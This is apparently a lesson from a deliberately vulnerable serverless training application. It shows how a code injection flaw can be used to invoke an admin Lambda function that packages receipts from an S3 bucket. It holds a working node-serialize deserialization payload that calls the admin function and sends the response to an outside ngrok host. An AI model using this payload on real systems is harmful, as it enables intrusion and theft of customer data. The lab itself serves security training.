# LESSON #3: Sensitive Information Disclosure

An attcker can leverage the [code injection vulnerability](../LESSONS/LESSON_01.md) to invoke an admin functionality that will disclosure all the receipts from the S3 bucket.

Sending the following payload will invoke an admin function that will pack all the receipts within the specified year and month and will created a signed url to download them.
```
{"action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p = {FunctionName: \"DVSA-ADMIN-GET-RECEIPT\", InvocationType: \"RequestResponse\", Payload: JSON.stringify({\"year\": \"2018\", \"month\": \"12\"})};lambda.invoke(p,function(e,d){ var h=require(\"http\");h.get(\"http://0c971764.ngrok.io/lol?data=\"+JSON.stringify(d));}); }()"}
```

As a result: 
![alt signed-url](https://i.imgur.com/yMkJhKi.png)


Pasting the url in the browser will download the receipts form the S3 bucket:

![alt receipts](https://i.imgur.com/OXDQC9K.png)

